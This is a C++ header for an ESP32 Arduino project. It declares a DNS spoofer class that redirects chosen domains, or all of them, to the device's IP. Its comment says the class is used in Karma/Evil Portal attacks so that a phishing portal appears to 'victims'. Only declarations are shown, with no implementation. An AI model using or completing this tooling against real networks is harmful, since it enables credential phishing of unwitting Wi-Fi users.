#pragma once
#include <WiFi.h>
#include <WiFiUdp.h>
#include <Arduino.h>

// DNS Spoofer - intercepts DNS queries and redirects specified domains
// to the ESP32's IP. Used during Karma/Evil Portal to make the portal
// appear when victims try to visit any real website.

#define MAX_SPOOF_DOMAINS 10

class DNSSpoof {
public:
  void begin();
  bool start(IPAddress redirectIP);
  void stop();
  void tick();
  void addDomain(const String& domain);
  void spoofAll(bool all) { _spoofAll = all; }
  bool isRunning() { return _running; }

private:
  WiFiUDP     _udp;
  IPAddress   _redirectIP;
  bool        _running  = false;
  bool        _spoofAll = true;
  String      _domains[MAX_SPOOF_DOMAINS];
  int         _domainCount = 0;
  int         _spoofed = 0;

  bool  _shouldSpoof(const String& domain);
  void  _handleQuery(uint8_t* buf, int len);
};

extern DNSSpoof dnsSpoof;
